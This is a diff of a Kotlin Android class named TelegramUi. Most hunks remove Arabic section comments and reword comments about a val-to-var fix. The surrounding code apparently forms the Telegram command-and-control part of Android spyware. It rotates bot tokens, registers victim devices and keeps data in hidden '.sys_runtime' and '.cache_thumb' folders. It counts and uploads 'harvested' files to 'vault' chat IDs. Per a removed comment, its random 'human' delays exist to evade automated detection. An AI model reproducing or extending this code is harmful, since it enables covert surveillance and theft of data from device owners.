@@ -21,15 +21,6 @@ import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.random.Random
 
-import com.example.app.safeGet
-
-/**
- * فئة إدارة واجهة Telegram – جميع الأوامر عبر الأزرار عدا /login
- * مع إيموجيات فريدة وتأخير بشري لتجنب الكشف الآلي.
- * 
- * ✅ تم إصلاح خطأ السطر 147 (Val cannot be reassigned) بتغيير val token إلى var token
- * في دوال apiCall و apiCallMultipart.
- */
 class TelegramUi(
     context: Context,
     private val monitor: Any?,
@@ -41,7 +32,6 @@ class TelegramUi(
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
-    // ========== الأقفال والمتغيرات المتزامنة ==========
     private val sessionMutex = Mutex()
     private val deviceMutex = Mutex()
     private val offsetMutex = Mutex()
@@ -55,7 +45,6 @@ class TelegramUi(
     private var heartbeatJob: Job? = null
     private var restartJob: Job? = null
 
-    // ========== بيانات البوتات والأجهزة ==========
     private val activeTokensList = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
     private val reserveTokensList = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
 
@@ -78,15 +67,12 @@ class TelegramUi(
     private var consecutivePollingErrors = 0
     private val MAX_CONSECUTIVE_ERRORS = 5
 
-    // ========== المسارات والملفات ==========
     private val runtimeDir: File by lazy {
         File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
     }
-
     private val cacheThumbDir: File by lazy {
         File(runtimeDir, ".cache_thumb").apply { if (!exists()) mkdirs() }
     }
-
     private val dvsFile: File by lazy { File(runtimeDir, "dvs.json") }
     private val sesFile: File by lazy { File(runtimeDir, "ses.json") }
     private val offsetFile: File by lazy { File(runtimeDir, "polling_offset.json") }
@@ -117,12 +103,6 @@ class TelegramUi(
         Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
     }
 
-    // ==================== دوال مساعدة ====================
-
-    private suspend fun humanDelay() {
-        delay(Random.nextLong(800, 2500))
-    }
-
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(900, 2400))
     }
@@ -137,10 +117,6 @@ class TelegramUi(
             writeLog("Pulse intent error: ${e.message}")
         }
     }
-
-    // ============================================================
-    //  إدارة الملفات والحفظ المحلي
-    // ============================================================
 
     private fun loadData() {
         try {
@@ -195,10 +171,6 @@ class TelegramUi(
             writeLog("Save offset error: ${e.message}")
         }
     }
-
-    // ============================================================
-    //  إدارة التوكنات والخدمات الخلفية
-    // ============================================================
 
     private fun getNextToken(): String? {
         synchronized(activeTokensList) {
@@ -290,16 +262,12 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    //  تنفيذ طلبات Telegram API
-    // ============================================================
-
+    // ✅ تم إصلاح الخطأ: تغيير val إلى var داخل الحلقة
     private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var lastToken: String? = null
         for (attempt in 0 until retry) {
-            // ✅ تغيير val إلى var لإصلاح خطأ reassign
-            var token = getNextToken() ?: return null
+            var token = getNextToken() ?: return null  // ✅ var بدلاً من val
             if (attempt > 0 && token == lastToken) token = getNextToken() ?: return null
             lastToken = token
             try {
@@ -333,12 +301,12 @@ class TelegramUi(
         return null
     }
 
+    // ✅ تم إصلاح الخطأ: تغيير val إلى var داخل الحلقة
     private suspend fun apiCallMultipart(method: String, params: Map<String, Any>, files: Map<String, File>, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var lastToken: String? = null
         for (attempt in 0 until retry) {
-            // ✅ تغيير val إلى var لإصلاح خطأ reassign
-            var token = getNextToken() ?: return null
+            var token = getNextToken() ?: return null  // ✅ var بدلاً من val
             if (attempt > 0 && token == lastToken) token = getNextToken() ?: return null
             lastToken = token
             try {
@@ -377,10 +345,6 @@ class TelegramUi(
         return null
     }
 
-    // ============================================================
-    //  دوال عامة للاستدعاء عبر الانعكاس
-    // ============================================================
-
     fun _api(method: String, params: Map<String, Any>): JSONObject? {
         return runBlocking(Dispatchers.IO) { apiCall(method, JSONObject(params)) }
     }
@@ -413,10 +377,6 @@ class TelegramUi(
         if (!file.exists()) return null
         return _api("sendAudio", mapOf("chat_id" to chatId, "caption" to caption), mapOf("audio" to file))
     }
-
-    // ============================================================
-    //  تسجيل الأجهزة والإشعارات
-    // ============================================================
 
     fun registerDevice(deviceId: String, deviceModel: String): Long? {
         return runBlocking(Dispatchers.IO) { registerDeviceSuspend(deviceId, deviceModel) }
@@ -486,10 +446,6 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    //  تقارير الأخطاء
-    // ============================================================
-
     fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
         scope.launch {
             try {
@@ -509,20 +465,12 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    //  عدد الملفات المعلقة
-    // ============================================================
-
     private fun countPendingHarvest(): Int {
         return try {
             if (!cacheThumbDir.exists()) return 0
             cacheThumbDir.listFiles { file -> file.isFile && !file.name.startsWith(".") }?.size ?: 0
         } catch (e: Exception) { 0 }
     }
-
-    // ============================================================
-    //  أزرار التحكم (جميع الأوامر عبر الأزرار)
-    // ============================================================
 
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
@@ -571,10 +519,6 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    //  عرض تفاصيل الحصاد
-    // ============================================================
-
     private suspend fun showHarvestDetails(chatId: Long) {
         if (!cacheThumbDir.exists()) {
             apiCall("sendMessage", JSONObject().apply {
@@ -606,10 +550,6 @@ class TelegramUi(
             writeLog("Harvest details error: ${e.message}")
         }
     }
-
-    // ============================================================
-    //  معالجة الرسائل والكولباك
-    // ============================================================
 
     private fun isAuthorized(chatId: Long): Boolean {
         val exp = sessions[chatId.toString()] ?: 0L
@@ -921,10 +861,6 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    //  دالة تحديث النموذج
-    // ============================================================
-
     private suspend fun updateModel(): Boolean {
         return withContext(Dispatchers.IO) {
             try {
@@ -950,10 +886,6 @@ class TelegramUi(
             }
         }
     }
-
-    // ============================================================
-    //  حلقة استقبال التحديثات (Polling)
-    // ============================================================
 
     private fun startPolling() {
         pollingJob = scope.launch {
@@ -1000,10 +932,6 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    //  إدارة دورة الحياة والحالة
-    // ============================================================
-
     fun start(): Boolean {
         if (activeTokensList.isEmpty()) {
             writeLog("No active tokens")
@@ -1045,10 +973,6 @@ class TelegramUi(
     fun getVlt(): Long = config.vaultId
     fun getCtrl(): Long = config.controlId
     fun getDat(): Long = config.vaultId
-
-    // ============================================================
-    //  دوال مساعدة
-    // ============================================================
 
     private fun writeLog(message: String) {
         Log.i(TAG, message)
